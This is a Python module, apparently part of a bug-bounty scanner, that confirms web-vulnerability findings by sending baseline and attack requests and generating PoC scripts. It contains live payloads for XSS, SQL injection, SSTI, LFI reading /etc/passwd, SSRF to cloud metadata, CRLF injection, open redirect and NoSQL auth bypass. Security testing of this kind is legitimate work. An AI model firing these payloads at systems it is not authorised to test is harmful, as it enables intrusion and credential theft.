"""
core/ai_proof.py
----------------
Automatic PoC generation and proof verification.

Given a finding, this module:
  1. Fetches baseline and attack responses
  2. Compares them (differential analysis)
  3. Confirms vulnerability with high confidence
  4. Generates triager-proof evidence
  5. Saves all evidence in a structured bundle
  6. Returns PROVEN | UNCONFIRMED | NEEDS_REVIEW
"""

import os
import re
import json
import time
import hashlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn, skip
from core.utils import safe_request, ensure_dir, save_json, write_lines
from core.rate_limiter import acquire
from core.platform_detect import is_termux, is_low_resource

log = get_logger("ai_proof")


# ─────────────────────────────────────────
# Proof verdicts
# ─────────────────────────────────────────
PROVEN = "PROVEN"
UNCONFIRMED = "UNCONFIRMED"
NEEDS_REVIEW = "NEEDS_REVIEW"
FALSE_POSITIVE = "FALSE_POSITIVE"


# ─────────────────────────────────────────
# Vulnerability-specific proof strategies
# ─────────────────────────────────────────
PROOF_STRATEGIES = {
    "xss": {
        "baseline_payload": "test123",
        "attack_payload": "<script>alert('XSS_PROOF')</script>",
        "proof_marker": "XSS_PROOF",
        "method": "reflection",
    },
    "sqli_error": {
        "baseline_payload": "1",
        "attack_payload": "1'\"",
        "proof_markers": [
            "sql syntax", "mysql_", "postgresql", "sqlite",
            "unclosed quotation", "odbc", "sqlstate",
        ],
        "method": "error_match",
    },
    "sqli_boolean": {
        "baseline_payload": "1 AND 1=1",
        "attack_payload": "1 AND 1=2",
        "method": "differential",
    },
    "ssti": {
        "baseline_payload": "test",
        "attack_payload": "{{7*7}}",
        "proof_marker": "49",
        "method": "reflection",
    },
    "ssti_twig": {
        "baseline_payload": "test",
        "attack_payload": "{{7*'7'}}",
        "proof_marker": "7777777",
        "method": "reflection",
    },
    "lfi": {
        "baseline_payload": "test.txt",
        "attack_payload": "../../../../etc/passwd",
        "proof_marker": "root:x:",
        "method": "reflection",
    },
    "open_redirect": {
        "baseline_payload": "/",
        "attack_payload": "https://evil-{token}.com",
        "method": "location_header",
    },
    "crlf": {
        "baseline_payload": "test",
        "attack_payload": "test%0d%0aInjected-Proof-{token}:yes",
        "method": "header_injection",
    },
    "ssrf": {
        "baseline_payload": "http://example.com",
        "attack_payload": "http://169.254.169.254/latest/meta-data/",
        "proof_markers": ["ami-id", "instance-id", "computeMetadata"],
        "method": "oob_or_reflection",
    },
    "idor": {
        "baseline_payload": "1",
        "attack_payload": "2",
        "method": "differential",
    },
    "nosql": {
        "baseline_payload": '{"user":"test","pass":"wrong"}',
        "attack_payload": '{"user":{"$ne":null},"pass":{"$ne":null}}',
        "method": "auth_bypass",
    },
}


# ─────────────────────────────────────────
# Proof token
# ─────────────────────────────────────────
def _proof_token() -> str:
    return hashlib.md5(str(time.time()).encode()).hexdigest()[:8]


# ─────────────────────────────────────────
# HTTP capture
# ─────────────────────────────────────────
def _capture_raw_request(url: str, method: str = "GET",
                         headers: Optional[Dict] = None,
                         body: str = "") -> str:
    p = urlparse(url)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    lines = [f"{method} {path} HTTP/1.1", f"Host: {p.netloc}"]
    for k, v in (headers or {}).items():
        lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Length: {len(body)}")
    lines.append("Connection: close")
    lines.append("")
    if body:
        lines.append(body)
    return "\r\n".join(lines)


def _capture_raw_response(resp) -> str:
    if resp is None:
        return "(no response)"
    lines = [f"HTTP/1.1 {resp.status_code}"]
    for k, v in resp.headers.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    body = (resp.text or "")[:5000]
    lines.append(body)
    return "\r\n".join(lines)


# ─────────────────────────────────────────
# Evidence bundle
# ─────────────────────────────────────────
class EvidenceBundle:
    def __init__(self, finding: Dict, output_dir: Path):
        self.finding = finding
        self.dir = output_dir
        ensure_dir(output_dir)
        self.evidence = {
            "finding_id": finding.get("id", ""),
            "vuln_type": finding.get("vuln_type", ""),
            "url": finding.get("url", ""),
            "param": finding.get("param", ""),
            "created_at": datetime.utcnow().isoformat(),
            "verdict": UNCONFIRMED,
            "confidence": 0,
            "baseline": {},
            "attack": {},
            "diff": {},
            "impact_chain": [],
            "reproduction_steps": [],
            "poc": {},
            "screenshots": [],
            "notes": [],
        }

    def add_note(self, note: str) -> None:
        self.evidence["notes"].append(note)

    def add_screenshot(self, path: str) -> None:
        self.evidence["screenshots"].append(path)

    def set_baseline(self, url: str, method: str, headers: Dict,
                     body: str, response) -> None:
        self.evidence["baseline"] = {
            "url": url,
            "method": method,
            "raw_request": _capture_raw_request(url, method, headers, body),
            "raw_response": _capture_raw_response(response),
            "status": response.status_code if response else 0,
            "length": len(response.content) if response else 0,
            "body_preview": (response.text or "")[:2000] if response else "",
        }

    def set_attack(self, url: str, method: str, headers: Dict,
                   body: str, response, payload: str) -> None:
        self.evidence["attack"] = {
            "url": url,
            "method": method,
            "payload": payload,
            "raw_request": _capture_raw_request(url, method, headers, body),
            "raw_response": _capture_raw_response(response),
            "status": response.status_code if response else 0,
            "length": len(response.content) if response else 0,
            "body_preview": (response.text or "")[:2000] if response else "",
        }

    def set_verdict(self, verdict: str, confidence: int, reason: str) -> None:
        self.evidence["verdict"] = verdict
        self.evidence["confidence"] = confidence
        self.evidence["reason"] = reason

    def set_impact_chain(self, chain: List[str]) -> None:
        self.evidence["impact_chain"] = chain

    def set_reproduction_steps(self, steps: List[str]) -> None:
        self.evidence["reproduction_steps"] = steps

    def set_poc(self, poc: Dict) -> None:
        self.evidence["poc"] = poc

    def save(self) -> Path:
        path = self.dir / "evidence.json"
        save_json(path, self.evidence)

        (self.dir / "baseline_request.txt").write_text(
            self.evidence["baseline"].get("raw_request", ""),
            encoding="utf-8"
        )
        (self.dir / "baseline_response.txt").write_text(
            self.evidence["baseline"].get("raw_response", ""),
            encoding="utf-8"
        )
        (self.dir / "attack_request.txt").write_text(
            self.evidence["attack"].get("raw_request", ""),
            encoding="utf-8"
        )
        (self.dir / "attack_response.txt").write_text(
            self.evidence["attack"].get("raw_response", ""),
            encoding="utf-8"
        )
        (self.dir / "poc.sh").write_text(
            self.evidence["poc"].get("curl", "#!/bin/bash\n"),
            encoding="utf-8"
        )
        (self.dir / "poc.py").write_text(
            self.evidence["poc"].get("python", "# No PoC"),
            encoding="utf-8"
        )
        (self.dir / "steps.md").write_text(
            "# Reproduction Steps\n\n" +
            "\n".join(f"{i+1}. {s}" for i, s in
                     enumerate(self.evidence["reproduction_steps"])),
            encoding="utf-8"
        )
        return path


# ─────────────────────────────────────────
# Param injection
# ─────────────────────────────────────────
def _inject_param(url: str, param: str, value: str) -> str:
    try:
        p = urlparse(url)
        qs = parse_qs(p.query)
        qs[param] = [value]
        return urlunparse((p.scheme, p.netloc, p.path, p.params,
                           urlencode(qs, doseq=True), ""))
    except Exception:
        return url


def _send(url: str, method: str = "GET",
          headers: Optional[Dict] = None,
          body: str = "") -> Optional[Any]:
    acquire(url)
    return safe_request(url, method=method, headers=headers,
                        data=body if body else None, timeout=12,
                        allow_redirects=False)


# ─────────────────────────────────────────
# Vulnerability-specific provers
# ─────────────────────────────────────────
def _prove_reflection(bundle: EvidenceBundle, finding: Dict,
                      strategy: Dict) -> bool:
    url = finding["url"]
    param = finding.get("param", "")
    if not param:
        return False

    token = _proof_token()
    marker = strategy.get("proof_marker", "")
    attack_payload = strategy["attack_payload"]
    if marker:
        attack_payload = attack_payload.replace("PAYLOAD", token)

    baseline_url = _inject_param(url, param, strategy["baseline_payload"])
    baseline_resp = _send(baseline_url)
    if not baseline_resp:
        bundle.add_note("baseline failed")
        return False
    bundle.set_baseline(baseline_url, "GET", {}, "", baseline_resp)

    attack_url = _inject_param(url, param, attack_payload)
    attack_resp = _send(attack_url)
    if not attack_resp:
        bundle.add_note("attack failed")
        return False
    bundle.set_attack(attack_url, "GET", {}, "", attack_resp, attack_payload)

    body = attack_resp.text or ""
    base_body = baseline_resp.text or ""

    if marker and marker in body and marker not in base_body:
        bundle.set_verdict(PROVEN, 95,
                           f"Payload marker '{marker}' reflected in response")
        return True

    if attack_payload in body and attack_payload not in base_body:
        bundle.set_verdict(PROVEN, 85,
                           "Payload reflected unescaped in response")
        return True

    bundle.set_verdict(UNCONFIRMED, 20, "Payload not reflected")
    return False


def _prove_differential(bundle: EvidenceBundle, finding: Dict,
                        strategy: Dict) -> bool:
    url = finding["url"]
    param = finding.get("param", "")
    if not param:
        return False

    baseline_url = _inject_param(url, param, strategy["baseline_payload"])
    attack_url = _inject_param(url, param, strategy["attack_payload"])

    baseline_resp = _send(baseline_url)
    attack_resp = _send(attack_url)

    if not baseline_resp or not attack_resp:
        return False

    bundle.set_baseline(baseline_url, "GET", {}, "", baseline_resp)
    bundle.set_attack(attack_url, "GET", {}, "", attack_resp,
                      strategy["attack_payload"])

    b_len = len(baseline_resp.content)
    a_len = len(attack_resp.content)
    b_status = baseline_resp.status_code
    a_status = attack_resp.status_code

    diff_len = abs(a_len - b_len)
    diff_status = b_status != a_status

    if diff_status or (b_len > 0 and diff_len / b_len > 0.10):
        bundle.set_verdict(
            PROVEN, 75,
            f"Differential: baseline={b_status}/{b_len}B, "
            f"attack={a_status}/{a_len}B"
        )
        return True

    bundle.set_verdict(UNCONFIRMED, 30, "No significant difference")
    return False


def _prove_error_match(bundle: EvidenceBundle, finding: Dict,
                       strategy: Dict) -> bool:
    url = finding["url"]
    param = finding.get("param", "")
    if not param:
        return False

    baseline_url = _inject_param(url, param, strategy["baseline_payload"])
    attack_url = _inject_param(url, param, strategy["attack_payload"])

    baseline_resp = _send(baseline_url)
    attack_resp = _send(attack_url)

    if not baseline_resp or not attack_resp:
        return False

    bundle.set_baseline(baseline_url, "GET", {}, "", baseline_resp)
    bundle.set_attack(attack_url, "GET", {}, "", attack_resp,
                      strategy["attack_payload"])

    body = (attack_resp.text or "").lower()
    base_body = (baseline_resp.text or "").lower()

    for marker in strategy.get("proof_markers", []):
        if marker.lower() in body and marker.lower() not in base_body:
            bundle.set_verdict(PROVEN, 90,
                               f"Error marker detected: '{marker}'")
            return True

    bundle.set_verdict(UNCONFIRMED, 25, "No error markers found")
    return False


def _prove_location_header(bundle: EvidenceBundle, finding: Dict,
                           strategy: Dict) -> bool:
    url = finding["url"]
    param = finding.get("param", "")
    if not param:
        return False

    token = _proof_token()
    payload = strategy["attack_payload"].replace("{token}", token)

    baseline_url = _inject_param(url, param, strategy["baseline_payload"])
    attack_url = _inject_param(url, param, payload)

    baseline_resp = _send(baseline_url)
    attack_resp = _send(attack_url)

    if not baseline_resp or not attack_resp:
        return False

    bundle.set_baseline(baseline_url, "GET", {}, "", baseline_resp)
    bundle.set_attack(attack_url, "GET", {}, "", attack_resp, payload)

    location = attack_resp.headers.get("Location", "")
    if f"evil-{token}" in location:
        bundle.set_verdict(PROVEN, 95,
                           f"Location header redirects to attacker: {location}")
        return True

    bundle.set_verdict(UNCONFIRMED, 20, f"No redirect. Location: {location[:100]}")
    return False


def _prove_header_injection(bundle: EvidenceBundle, finding: Dict,
                            strategy: Dict) -> bool:
    url = finding["url"]
    param = finding.get("param", "")
    if not param:
        return False

    token = _proof_token()
    payload = strategy["attack_payload"].replace("{token}", token)

    baseline_url = _inject_param(url, param, strategy["baseline_payload"])
    attack_url = _inject_param(url, param, payload)

    baseline_resp = _send(baseline_url)
    attack_resp = _send(attack_url)

    if not baseline_resp or not attack_resp:
        return False

    bundle.set_baseline(baseline_url, "GET", {}, "", baseline_resp)
    bundle.set_attack(attack_url, "GET", {}, "", attack_resp, payload)

    for k in attack_resp.headers:
        if "injected-proof" in k.lower() and token in attack_resp.headers[k]:
            bundle.set_verdict(PROVEN, 90,
                               f"Injected header '{k}' present in response")
            return True

    bundle.set_verdict(UNCONFIRMED, 20, "No injected header")
    return False


def _prove_oob(bundle: EvidenceBundle, finding: Dict,
               strategy: Dict) -> bool:
    try:
        from burp.collaborator import get_oob_payload
    except Exception:
        bundle.add_note("OOB provider unavailable")
        return False

    oob = get_oob_payload()
    if not oob.get("ok"):
        bundle.add_note("No OOB payload available")
        return False

    oob_url = oob.get("payload", "")
    url = finding["url"]
    param = finding.get("param", "")
    payload = oob_url or strategy["attack_payload"]

    attack_url = _inject_param(url, param, payload)
    attack_resp = _send(attack_url)

    bundle.set_attack(attack_url, "GET", {}, "", attack_resp, payload)
    bundle.add_note(f"OOB payload sent: {payload}. "
                    f"Check Collaborator/Interactsh for callback.")
    bundle.set_verdict(
        NEEDS_REVIEW, 60,
        "OOB payload submitted — verify callback in Burp Collaborator/Interactsh"
    )
    return False


def _prove_auth_bypass(bundle: EvidenceBundle, finding: Dict,
                       strategy: Dict) -> bool:
    url = finding["url"]
    method = finding.get("method", "POST")

    baseline_resp = _send(url, method=method,
                          headers={"Content-Type": "application/json"},
                          body=strategy["baseline_payload"])
    attack_resp = _send(url, method=method,
                        headers={"Content-Type": "application/json"},
                        body=strategy["attack_payload"])

    if not baseline_resp or not attack_resp:
        return False

    bundle.set_baseline(url, method,
                        {"Content-Type": "application/json"},
                        strategy["baseline_payload"], baseline_resp)
    bundle.set_attack(url, method,
                      {"Content-Type": "application/json"},
                      strategy["attack_payload"], attack_resp,
                      strategy["attack_payload"])

    success_markers = ["token", "welcome", "success", "dashboard",
                       "authenticated", "user_id", "account"]
    attack_body = (attack_resp.text or "").lower()

    if attack_resp.status_code == 200 and any(m in attack_body
                                              for m in success_markers):
        bundle.set_verdict(PROVEN, 80,
                           "Auth bypass: attack payload accepted")
        return True

    bundle.set_verdict(UNCONFIRMED, 25, "No auth bypass detected")
    return False


# ─────────────────────────────────────────
# Reproduction steps
# ─────────────────────────────────────────
def _build_reproduction_steps(bundle: EvidenceBundle, finding: Dict) -> List[str]:
    url = finding.get("url", "")
    param = finding.get("param", "")
    payload = bundle.evidence["attack"].get("payload", "")
    method = bundle.evidence["attack"].get("method", "GET")

    steps = [
        f"Navigate to the target: {url}",
        f"Identify the vulnerable parameter: `{param}`" if param
        else "Identify the vulnerable endpoint",
        f"Send the following payload: `{payload}`",
        f"Use method: `{method}`",
        "Observe the response — the vulnerability is confirmed by "
        "the diff between baseline and attack.",
    ]
    return steps


# ─────────────────────────────────────────
# Impact chain
# ─────────────────────────────────────────
IMPACT_CHAINS = {
    "xss": [
        "Steal session cookies (if not HttpOnly)",
        "Perform actions on behalf of victim (CSRF-like)",
        "Phishing / credential theft",
        "Potentially escalate to Account Takeover",
    ],
    "sqli_error": [
        "Extract database contents (usernames, passwords, tokens)",
        "Read files from server filesystem",
        "Potentially achieve Remote Code Execution",
    ],
    "sqli_boolean": [
        "Blind data exfiltration",
        "Enumerate database schema",
        "Extract sensitive records",
    ],
    "ssti": [
        "Achieve Remote Code Execution on server",
        "Read arbitrary files",
        "Full server compromise",
    ],
    "lfi": [
        "Read sensitive files (/etc/passwd, config files, private keys)",
        "Potentially chain with log poisoning to RCE",
    ],
    "open_redirect": [
        "Phishing via trusted domain",
        "OAuth token theft if chained",
    ],
    "ssrf": [
        "Access internal services",
        "Retrieve cloud metadata (AWS/GCP/Azure credentials)",
        "Potentially achieve RCE in cloud environments",
    ],
    "idor": [
        "Access other users' data",
        "Enumerate all records",
        "Potentially modify/delete others' data",
    ],
    "crlf": [
        "HTTP response splitting",
        "Cache poisoning",
        "Session fixation",
    ],
    "nosql": [
        "Authentication bypass",
        "Data exfiltration",
        "Privilege escalation",
    ],
}


def _build_impact_chain(vuln_type: str) -> List[str]:
    key = (vuln_type or "").lower()
    for k, chain in IMPACT_CHAINS.items():
        if k in key:
            return chain
    return ["Security impact depends on context — review evidence."]


# ─────────────────────────────────────────
# PoC generator
# ─────────────────────────────────────────
def _build_poc(bundle: EvidenceBundle) -> Dict:
    atk = bundle.evidence["attack"]
    url = atk.get("url", "")
    method = atk.get("method", "GET")
    payload = atk.get("payload", "")
    headers = atk.get("headers", {}) or {}

    curl_lines = [f"curl -i -sk -X {method}"]
    for k, v in headers.items():
        curl_lines.append(f'  -H "{k}: {v}"')
    if method == "POST" and payload:
        curl_lines.append(f"  --data '{payload}'")
    curl_lines.append(f'  "{url}"')
    curl = " \\\n".join(curl_lines)

    python = f'''import requests
import urllib3
urllib3.disable_warnings()

url = "{url}"
method = "{method}"
headers = {json.dumps(headers)}
data = {json.dumps(payload) if method == "POST" else '""'}

r = requests.request(method, url, headers=headers,
                     data=data if data else None,
                     verify=False, allow_redirects=False)

print(f"Status: {{r.status_code}}")
print(f"Length: {{len(r.content)}}")
print(r.text[:3000])
'''

    return {
        "curl": f"#!/bin/bash\n# PoC — {bundle.evidence['vuln_type']}\n{curl}\n",
        "python": python,
    }


# ─────────────────────────────────────────
# Main prover
# ─────────────────────────────────────────
def prove_finding(finding: Dict,
                  output_root: str = "results") -> Dict:
    vuln_type = (finding.get("vuln_type") or "").lower()
    domain = finding.get("host") or urlparse(finding.get("url", "")).netloc

    out_dir = Path(output_root) / domain / "proofs" / \
              re.sub(r"[^a-z0-9_-]", "_", vuln_type)[:60]
    ensure_dir(out_dir)

    bundle = EvidenceBundle(finding, out_dir)

    strategy = PROOF_STRATEGIES.get(vuln_type)
    if not strategy:
        for k in PROOF_STRATEGIES:
            if k in vuln_type:
                strategy = PROOF_STRATEGIES[k]
                break

    if not strategy:
        bundle.set_verdict(NEEDS_REVIEW, 0,
                           f"No proof strategy for '{vuln_type}'")
        bundle.save()
        return bundle.evidence

    method = strategy.get("method", "reflection")
    try:
        if method == "reflection":
            _prove_reflection(bundle, finding, strategy)
        elif method == "differential":
            _prove_differential(bundle, finding, strategy)
        elif method == "error_match":
            _prove_error_match(bundle, finding, strategy)
        elif method == "location_header":
            _prove_location_header(bundle, finding, strategy)
        elif method == "header_injection":
            _prove_header_injection(bundle, finding, strategy)
        elif method == "oob_or_reflection":
            _prove_oob(bundle, finding, strategy)
        elif method == "auth_bypass":
            _prove_auth_bypass(bundle, finding, strategy)
        else:
            bundle.set_verdict(NEEDS_REVIEW, 0,
                               f"Unknown proof method '{method}'")
    except Exception as e:
        log.debug(f"proof dispatch failed: {e}")
        bundle.add_note(f"proof error: {e}")
        bundle.set_verdict(NEEDS_REVIEW, 0, f"error: {e}")

    bundle.set_impact_chain(_build_impact_chain(vuln_type))
    bundle.set_reproduction_steps(_build_reproduction_steps(bundle, finding))
    bundle.set_poc(_build_poc(bundle))

    # ────── Enrich with triager-friendly content ──────
    try:
        from core.poc_enhancer import enhance_evidence
        enhanced = enhance_evidence(
            bundle.evidence, finding, out_dir,
            enable_video=(bundle.evidence["verdict"] == PROVEN
                          and not is_low_resource())
        )
        bundle.evidence["enhanced"] = enhanced
    except Exception as e:
        log.debug(f"enhance failed: {e}")
    # ────── END enrichment ──────

    path = bundle.save()
    ok(f"Proof: {bundle.evidence['verdict']} "
       f"({bundle.evidence['confidence']}%) → {path}")
    return bundle.evidence


# ─────────────────────────────────────────
# Bulk proof
# ─────────────────────────────────────────
def prove_findings(findings: List[Dict],
                   output_root: str = "results",
                   max_proofs: int = 20) -> Dict:
    results = {
        "proven": 0,
        "unconfirmed": 0,
        "needs_review": 0,
        "skipped": 0,
        "details": [],
    }

    for f in findings[:max_proofs]:
        try:
            r = prove_finding(f, output_root)
            v = r.get("verdict", NEEDS_REVIEW)
            if v == PROVEN:
                results["proven"] += 1
            elif v == UNCONFIRMED:
                results["unconfirmed"] += 1
            else:
                results["needs_review"] += 1
            results["details"].append({
                "url": f.get("url", ""),
                "vuln_type": f.get("vuln_type", ""),
                "verdict": v,
                "confidence": r.get("confidence", 0),
            })
        except Exception as e:
            results["skipped"] += 1
            log.debug(f"prove failed: {e}")

    return results


# ─────────────────────────────────────────
# CLI
# ─────────────────────────────────────────
if __name__ == "__main__":
    import argparse

    p = argparse.ArgumentParser(description="Automatic PoC & proof verifier")
    p.add_argument("--url", help="Target URL")
    p.add_argument("--vuln", help="Vulnerability type (e.g. xss, sqli_error)")
    p.add_argument("--param", default="", help="Parameter name")
    p.add_argument("--domain", default="", help="Domain for output dir")
    p.add_argument("--output", default="results")
    p.add_argument("--bulk-from-db", action="store_true",
                   help="Prove all confirmed findings from DB")
    args = p.parse_args()

    if args.bulk_from_db:
        try:
            from core.database import get_db
            db = get_db()
            conn = db._conn()
            rows = conn.execute(
                "SELECT * FROM findings WHERE status='confirmed' LIMIT 50"
            ).fetchall()
            conn.close()
            all_findings = [dict(r) for r in rows]
            if not all_findings:
                print("No confirmed findings in DB")
            else:
                r = prove_findings(all_findings, args.output)
                print(json.dumps(r, indent=2, default=str))
        except Exception as e:
            print(f"DB read failed: {e}")

    elif args.url and args.vuln:
        finding = {
            "url": args.url,
            "vuln_type": args.vuln,
            "param": args.param,
            "host": args.domain or urlparse(args.url).netloc,
        }
        r = prove_finding(finding, args.output)
        print(json.dumps(r, indent=2, default=str))
    else:
        print("Use --url + --vuln, or --bulk-from-db")